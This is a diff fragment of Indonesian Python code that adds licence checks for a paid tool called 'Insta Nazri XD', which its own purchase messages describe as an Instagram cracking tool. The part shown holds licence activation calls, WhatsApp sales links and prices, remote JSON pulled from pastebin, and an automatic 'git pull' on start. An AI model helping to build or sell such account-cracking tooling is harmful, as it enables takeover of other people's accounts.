+	prints(Panel(f"{P2}silahkan masukan lisensi tools agar bisa masuk ke tools Insta Nazri XD\njika anda belum mempunyai lisensi ketik {H2}beli {P2}untuk melihat harga lisensi"))
+	key = input(f"{P}[{B}?{P}] masukan lisensi : {H}")
+	if key in ["beli","Beli","BELI"]:beli_bang()
+	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzMjA4OTAxMyIsInRqSVB5U1dJQkFVdU1yMmFGVGk5eW5ZbnpuOWlmS3FHVjVMdG1Yb1EiXQ==&ProductId=17890&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{H2}selamat lisensi yang anda masukan terdaftar ke server Insta Nazri XD",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(3);ggwp17()
+	except KeyError:
+		prints(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
+
+###----------[ CEK LISENSI ]---------- ###				
+def cek():
+	try:x=open("data/lisensi.txt","r").read()
+	except FileNotFoundError:key()
+	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzMjA4OTAxMyIsInRqSVB5U1dJQkFVdU1yMmFGVGk5eW5ZbnpuOWlmS3FHVjVMdG1Yb1EiXQ==&ProductId=17890&Key=%s"%(x)).json()['licenseKey']['key'];ggwp17()
+	except KeyError:
+		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
+
+###----------[ BUY LISENSI ]---------- ###	
+def beli_bang():
+    prints(Panel(f"{P2}[{H2}01{P2}]. 1 minggu {H2}50.000 {P2}max pemakaian 1 device\n{P2}[{H2}02{P2}]. 1 bulan {H2}100.000{P2} max pemakaian 5 device\n{P2}[{H2}03{P2}]. open source full update {H2}450.000",width=80,padding=(0,15),style=f"#FFFFFF"))
+    zxc = input(f"{P}[{B}?{P}] pilih lisensi : {H}")
+    if zxc in [""]:print(f"{P}[{M}!{P}] pilih yang bener broo jangan kosong");time.sleep(3);cek_lisensi_aktif()
+    elif zxc in ["1","01"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+1+minggu");time.sleep(2);exit()
+    elif zxc in ["2","02"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
+    elif zxc in ["3","03"]:jalan(f"{P}[{M}!{P}] anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+full+source");time.sleep(2);exit()
+    else:print(f"{P}[{M}!{P}] ngetik apaan lu ngab");time.sleep(3);cek_lisensi_aktif()
+
+###----------[ CEK LISENSI AKTIF ]---------- ###
+def cek_lisensi_aktif():
+	try:xz = open("data/lisensi.txt","r").read()
+	except FileNotFoundError:key()
+	os.system("clear");cek()
+
+if __name__=='__main__':
+	lisensiku.append("sukses")
+	try:
+	    with requests.Session() as ses:
+	         ko = ses.get('https://pastebin.com/raw/0cWckNrU').json()
+	         HARIS.update(ko)
+	         ki = ses.get('https://pastebin.com/raw/9GybVKaq').json()
+	         HARIS1.update(ki)
+	         os.system("git pull")
+	         ggwp17()
+	except requests.exceptions.ConnectionError:
+		print(f'{P}[{M}!{P}] koneksi internet anda bermasalah')
+		time.sleep(0.03)
+		exit()
